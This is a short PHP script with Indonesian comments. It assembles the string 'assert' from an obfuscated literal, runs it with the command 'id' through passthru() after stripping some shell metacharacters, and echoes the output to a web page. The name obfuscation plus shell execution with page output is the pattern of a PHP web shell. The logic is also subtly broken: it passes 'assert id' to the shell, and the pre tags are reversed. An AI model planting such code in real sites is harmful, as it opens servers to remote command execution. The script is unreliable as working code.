<?php

$a = str_replace('x', '', 'axsxxsxexrxxt');
$comm = 'id';

// Hapus karakter yang berpotensi berbahaya dari $comm
$comm = str_replace(array(';', '|', '`', '$', '(', ')', '{', '}', '[', ']', '<', '>'), '', $comm);

ob_start(); // Mulai penyimpanan keluaran (output)
passthru($a . ' ' . $comm);
$output = ob_get_clean(); // Tangkap keluaran dan bersihkan penampungan

echo "</pre>" . htmlspecialchars($output) . "<pre>"; // Tampilkan keluaran (output)

die;

?>
